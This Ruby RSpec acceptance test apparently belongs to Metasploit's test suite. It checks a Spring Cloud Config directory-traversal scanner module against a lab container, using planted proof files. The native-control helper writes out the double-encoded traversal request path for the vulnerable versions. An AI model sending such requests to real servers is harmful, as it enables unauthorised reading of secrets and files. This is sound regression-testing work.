require 'acceptance_spec_helper'
require 'net/http'
require 'digest'

RSpec.describe 'Genuine Spring Cloud Config file collection', acceptance: true, order: :defined do
  include_context 'module target'

  before(:all) do
    @version = ENV.fetch('SPRINGCLOUD_VERSION')
    @location = target_exec('target', 'printenv', 'SPRINGCLOUD_LOCATION').strip
    @exposed = %w[2.1.8.RELEASE 2.2.2.RELEASE].include?(@version) && @location == 'file:./'
    @birth = target_exec('target', 'cat', '/proc/1/stat').split(') ', 2).last.split.fetch(19)
    verify_artifact
    native_control('before')
  end

  after do
    %w[sessions jobs].each do |kind|
      expect(console_command("irb -e 'puts \"SPRINGCLOUD_IDLE=\" + framework.#{kind}.keys.to_json'")).to include('SPRINGCLOUD_IDLE=[]')
    end
    expect(target_exec('target', 'cat', '/proc/1/stat').split(') ', 2).last.split.fetch(19)).to eq(@birth)
  end

  after(:all) do
    native_control('after') if @version
    verify_artifact if @version
    %w[target framework].each do |role|
      expect(target_exec(role, 'cat', '/sys/fs/cgroup/memory.events')).to include("oom 0\n", "oom_kill 0\n")
      expect(target_exec(role, 'cat', '/sys/fs/cgroup/pids.events').strip).to eq('max 0')
    end
  end

  it 'collects the outside properties file exactly twice' do
    collect_twice('secret.properties', "lab.secret=TRAVERSAL-PROOF-UNRELATED-PATH\n")
  end

  it 'collects a root-level file without selecting the environment route twice' do
    collect_twice('/springcloud-proof.txt', "Spring Cloud Config root-level proof\n")
  end

  it 'collects plain text exactly twice' do
    collect_twice('plain.txt', "SpringCloud outside repository exact plain text\n")
  end

  it 'preserves a filename with spaces and Unicode twice' do
    collect_twice('sp ace-Ω.txt', "Spring Cloud Config UTF-8 path: Ω\n")
  end

  it 'preserves all 256 binary octets twice' do
    collect_twice('binary.bin', (0..255).to_a.pack('C*'))
  end

  it 'collects a genuinely empty file twice' do
    collect_twice('empty.txt', '')
  end

  it 'does not save configuration JSON or error pages for a missing file twice' do
    collect_twice('missing.txt', nil)
  end

  def journal(name, record)
    File.open(File.join(target_runtime.fetch('artifacts'), name), 'a') { |file| file.puts(JSON.generate(record)) }
  end

  def verify_artifact
    root = File.expand_path('../../../../..', __dir__)
    catalog = JSON.parse(File.read(File.join(root, 'test/module_targets/springcloud_config/vendor.json')))
    expect(target_exec('target', 'sha256sum', '/opt/app.jar').split.first).to eq(catalog.fetch(@version).fetch('jar_sha256'))
  end

  def native_request(path, phase, binary: false)
    endpoint = target_endpoint('target')
    request = Net::HTTP::Get.new(path)
    request['Accept'] = 'application/octet-stream' if binary
    response = Net::HTTP.start(endpoint.fetch('host'), endpoint.fetch('port'), nil, open_timeout: 5, read_timeout: 10) { |http| http.request(request) }
    journal('native-http.jsonl', phase: phase, path: path, accept: request['Accept'], status: response.code.to_i, bytes: response.body.to_s.bytesize, content_type: response['Content-Type'], body_hex: response.body.to_s.unpack1('H*'))
    response
  end

  def native_control(phase)
    normal = native_request('/foo/development', phase)
    expect(normal.code.to_i).to eq(200)
    expect(JSON.parse(normal.body).fetch('propertySources').map { |source| source.fetch('source') }).to include(hash_including('lab.normal' => 'GENUINE-CONFIG-BASELINE'))
    resource = native_request('/foo/default/master/application.properties', phase, binary: true)
    expect(resource.code.to_i).to eq(200)
    expect(resource.body.b).to eq("lab.normal=GENUINE-CONFIG-BASELINE\n".b)
    root = native_request('/foo/default/master/%252Fspringcloud-proof.txt', phase, binary: true)
    expect(root.code.to_i).to eq(@exposed ? 200 : 404)
    expect(root.body.b).to eq("Spring Cloud Config root-level proof\n".b) if @exposed
    {
      'secret.properties' => "lab.secret=TRAVERSAL-PROOF-UNRELATED-PATH\n",
      'plain.txt' => "SpringCloud outside repository exact plain text\n",
      'sp ace-Ω.txt' => "Spring Cloud Config UTF-8 path: Ω\n",
      'binary.bin' => (0..255).to_a.pack('C*'),
      'empty.txt' => ''
    }.each do |name, bytes|
      # Match the vendor regression: relative file:./ search location and an
      # encoded absolute first slash. The ordinary config endpoint stays real.
      path = '/foo/default/master/%252Flab/proof/' + URI::DEFAULT_PARSER.escape(name)
      response = native_request(path, phase, binary: true)
      expect(response.code.to_i).to eq(@exposed ? 200 : 404)
      expect(response.body.to_s.b).to eq(bytes.b) if @exposed
    end
    expect(native_request('/foo/default/master/%252Flab/proof/missing.txt', phase, binary: true).code.to_i).to eq(404)
  end

  def loot_files
    Dir[File.join(target_runtime.fetch('artifacts'), 'msf-config', 'loot', '*')].select { |path| File.file?(path) }.sort
  end

  def collect_twice(name, expected)
    2.times do
      before = loot_files
      output = nil
      begin
        output = run_target_module('auxiliary/scanner/http/springcloud_directory_traversal', 'target', { 'FILEPATH' => name.start_with?('/') ? name : '/lab/proof/' + name, 'THREADS' => 1, 'HttpClientTimeout' => 8 }, allow_errors: true, command_timeout: 40)
      ensure
        journal('owning-calls.jsonl', file: name, output: (output || console.all_data).dup.force_encoding(Encoding::UTF_8), wrapper_returned: !output.nil?)
      end
      created = loot_files - before
      if @exposed && !expected.nil?
        expect(created.length).to eq(1), output
        expect(File.binread(created.first)).to eq(expected.b)
        expect(output).to include('File saved in:')
        journal('verified-loot.jsonl', file: name, path: created.first, bytes: expected.bytesize, sha256: Digest::SHA256.file(created.first).hexdigest)
      else
        expect(created).to eq([]), output
        expect(output).not_to include('File saved in:')
      end
    end
  end
end
